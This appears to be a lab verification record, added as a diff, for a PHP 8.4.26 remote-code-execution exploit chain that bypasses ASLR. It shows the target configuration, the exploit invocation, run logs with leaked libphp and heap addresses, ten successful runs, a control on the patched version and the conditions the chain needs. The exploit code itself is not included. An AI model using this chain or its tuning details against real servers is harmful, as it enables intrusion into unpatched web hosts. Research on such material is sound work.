@@ -1,0 +1,77 @@
+9bie/php2shell-bypass-aslr-exp — `pure/` chain under display_errors=Off + ASLR on
+Verified 2026-11-09 by T-GAP1. Transcript condensed from the run log; the operational bodies
+stay in the private lab log.
+
+upstream commit: d6f888ebd3f0e188bb662e16f23747afdf35e42f (2026-10-24, "Merge PR #8: add Japanese README")
+--- target ---
+PHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
+display_errors => Off => Off
+display_startup_errors => Off => Off
+memory_limit => 128M => 128M
+post_max_size => 8M => 8M
+session.sid_length => 32 => 32
+session.upload_progress.enabled => On => On
+session.use_strict_mode => Off => Off
+--- MPM (official prefork) ---
+StartServers 5 | MinSpareServers 5 | MaxSpareServers 10 | MaxRequestWorkers 150 | MaxConnectionsPerChild 0
+--- webroot ---
+<?php echo "OK\n"; ?>
+--- image ---
+php:8.4.26-apache sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
+host randomize_va_space: 2 (no setarch, no gdb, no symbols, nothing from /proc of the target)
+
+=== canonical run ===
+$ ./pure/run_pure.sh                       # p2s-pure-18110, 127.0.0.1:18110
+$ python3 exploit.py --port 18110 --docker docker --cmd 'id>/out/p6' --proof out/p6
+
+      pinned 150/150 workers (149 holders)
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fef35324b60 -> libphp=0x7fef34cc6000
+      chunk buckets: [('0x7fef32a00000', 7495), ('0x7fef35200000', 1095), ('0x7fef33000000', 87), ('0x7fef32800000', 79)]
+[try 1] A2 + B2: main=0x7fef33000000 S=0x7fef330f8398 zif_system=0x7fef3512b370
+[4/4] RCE OK; proof out/p6:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+=== 10 runs, fresh ASLR each (docker restart before every run) ===
+run | libphp               | main                 | result
+  1 | 0x7f783c99e000       | 0x7f783ae00000       | RCE OK
+  2 | 0x7f7c502e2000       | 0x7f7c4e600000       | RCE OK
+  3 | 0x7f27e14cf000       | 0x7f27df800000       | RCE OK
+  4 | 0x7f5877497000       | 0x7f5875800000       | RCE OK
+  5 | 0x7f9b79692000       | 0x7f9b77a00000       | RCE OK
+  6 | 0x7fe1a1994000       | 0x7fe19fe00000       | RCE OK
+  7 | 0x7f9360223000       | 0x7f935e600000       | RCE OK
+  8 | 0x7fd1c7c70000       | 0x7fd1c6000000       | RCE OK
+  9 | 0x7f562961b000       | 0x7f5627a00000       | RCE OK
+ 10 | 0x7fb4a5dff000       | 0x7fb4a4200000       | RCE OK
+
+10/10, 10 distinct libphp bases, 10 distinct main allocations, decoded=819208 in every run.
+
+=== control: php:8.4.27-apache, same profile, same exploit ===
+      pinned 150/150 workers (149 holders)
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      leak failed: RuntimeError('no heap pointers in leak window')
+[try 2] A1: END-cleanup send_cookie OOM
+[try 2] B1: stale-id OOB read (chunk base + libphp)
+      leak failed: RuntimeError('no heap pointers in leak window')
+[try 3] A1: END-cleanup send_cookie OOM
+[try 3] B1: stale-id OOB read (chunk base + libphp)
+      leak failed: RuntimeError('no heap pointers in leak window')
+[4/4] all attempts failed
+0/5 runs, identical output.
+
+=== boundaries of this row ===
+- Requires the stock 128M geometry + the official php.ini-production. At memory_limit=8M the
+  chain is 0/3: A1 does not exhaust memory, so B1 never gets its stale id.
+- The repo's own tooling/docker-compose.yml does not reproduce it: vuln-8426 loads no php.ini
+  (Loaded Configuration File => (none)) and reports display_errors => STDOUT. Adding only
+  display_errors=Off on top of hardening-off.ini gives 0/3, because B1 finds no pointers: the
+  chain is calibrated for php.ini-production, not for a conf.d overlay.
+- Cold start not characterized: a first run on a freshly created target gave 0/3 with
+  'no heap pointers in leak window'; after docker restart the same target gave 3/3. The 10/10
+  above restarts before each run.
+- 149 holders pinned; if MaxRequestWorkers differs, --workers N has to be adjusted, and if more
+  than N-1 are busy the requests queue and B1 may land on another child.
+- FPM and CVE-2026-115560 were not measured: the stock path already closed the question.
